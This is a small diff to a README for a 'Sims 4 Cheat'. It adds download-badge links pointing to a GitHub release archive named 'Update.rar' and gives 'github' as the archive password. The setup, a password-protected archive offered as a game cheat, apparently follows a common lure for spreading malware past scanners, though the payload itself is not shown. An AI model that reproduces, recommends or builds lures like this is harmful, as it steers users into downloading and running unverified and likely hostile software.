@@ -1,9 +1,9 @@
 
-# Sims 4 Cheat [![Download Sims 4 Cheats](https://img.shields.io/badge/Download-Sims%204%20Cheat-blue)]()
+# Sims 4 Cheat [![Download Sims 4 Cheats](https://img.shields.io/badge/Download-Sims%204%20Cheat-blue)](https://github.com/ASTRO226/sims-cheat/releases/download/Release/Update.rar)
 
 ## Installation
 To install the Sims 4 Cheat , follow these simple steps:
-1. [![Download Sims 4 Cheats](https://img.shields.io/badge/Download-Sims%204%20Cheat-blue)]()
+1. [![Download Sims 4 Cheats](https://img.shields.io/badge/Download-Sims%204%20Cheat-blue)](https://github.com/ASTRO226/sims-cheat/releases/download/Release/Update.rar)
    
 2. **Pass: github**
 
